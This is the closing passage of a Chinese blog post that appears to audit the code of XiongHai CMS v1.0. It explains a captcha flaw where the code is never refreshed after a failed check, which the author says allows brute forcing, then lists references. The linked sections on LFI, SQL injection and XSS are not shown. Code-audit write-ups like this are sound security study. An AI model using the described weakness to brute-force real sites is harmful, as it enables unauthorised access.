<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201105657761.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201105657761.png" alt="image-20221201105657761"></p>
<p>查看<code>/inc/code.class.php</code></p>
<p>它这里的逻辑就是生成验证码图片并将对应的字符串存入SESSION</p>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201105800295.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201105800295.png" alt="image-20221201105800295"></p>
<p>我们看看验证逻辑，在<code>/files/submit.php</code>中，只是做了简单的比较操作，如果错误就退出也没有刷新操作。所以是可以被用来直接爆破的</p>
<p class='item-img' data-src='/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201105835192.png'><img src="/2022/12/01/%E7%86%8A%E6%B5%B7CMSV1.0%E5%88%86%E6%9E%90/image-20221201105835192.png" alt="image-20221201105835192"></p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="https://pino-hd.github.io/2018/06/10/%E7%86%8A%E6%B5%B7CMSv1-0/">https://pino-hd.github.io/2018/06/10/%E7%86%8A%E6%B5%B7CMSv1-0/</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10393">https://xz.aliyun.com/t/10393</a></p>
<p><a target="_blank" rel="noopener" href="https://y4tacker.blog.csdn.net/article/details/111501407">https://y4tacker.blog.csdn.net/article/details/111501407</a></p>
<p><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#%E6%9E%B6%E6%9E%84">https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#%E6%9E%B6%E6%9E%84</a></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2022/12/03/KYXSCMS%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/">← Next 跟着Y4师傅学代码审计-KYXSCMS_1.3.0</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2022/11/29/ctfshow-%E6%A1%86%E6%9E%B6%E5%A4%8D%E7%8E%B0/">CTFSHOW-框架复现 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">RacerZ</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/RacerZ-fighting"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" href="qiyizhang2002@foxmail.com"><i class="fa fa-envelope" alt="E-Mail"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83"><span class="toc-number">2.</span> <span class="toc-text">配置环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">3.</span> <span class="toc-text">代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#LFI"><span class="toc-number">3.1.</span> <span class="toc-text">LFI</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#INSTALL%E5%AE%89%E8%A3%85%E9%80%BB%E8%BE%91%E9%97%AE%E9%A2%98"><span class="toc-number">3.2.</span> <span class="toc-text">INSTALL安装逻辑问题</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.3.</span> <span class="toc-text">越权漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL-Injection"><span class="toc-number">3.4.</span> <span class="toc-text">SQL Injection</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0SQL"><span class="toc-number">3.5.</span> <span class="toc-text">后台SQL</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS"><span class="toc-number">4.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E9%80%BB%E8%BE%91%E9%97%AE%E9%A2%98"><span class="toc-number">4.1.</span> <span class="toc-text">验证码逻辑问题</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">5.</span> <span class="toc-text">参考链接</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>